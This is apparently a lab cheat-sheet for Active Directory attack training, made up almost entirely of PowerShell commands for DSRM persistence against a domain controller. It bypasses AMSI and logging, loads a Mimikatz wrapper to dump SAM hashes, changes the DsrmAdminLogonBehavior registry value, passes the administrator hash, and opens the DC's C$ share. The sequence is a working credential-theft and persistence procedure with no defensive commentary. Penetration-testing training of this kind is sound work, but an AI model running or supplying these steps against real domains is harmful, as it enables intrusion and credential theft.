**Bypass ESBL & AMSI in target host:**
```powershell
$sess = New-PSSession dcorp-dc
Enter-PSSession -Session $sess
#Bypass ESBL
#Bypass AMSI
```

**Load the Invoke-Mimi script in the session, Run the below command on local machine:**
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```

**Extract the credentials from the SAM file from the DC:**
```powershell
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
```

**Change the logon behavior for the account:**
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**Now from our local system we can just pass the hash for the DSRM administrator:**
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /domain:corp-dc /user:Administrator /ntlm:ntlm-admin-hash /run:powershell.exe"'
```

**We can now access the dcorp-dc directly from the new session:**
```powershell
ls \\corp-dc.dollarcorp.moneycorp.local\C$\
```
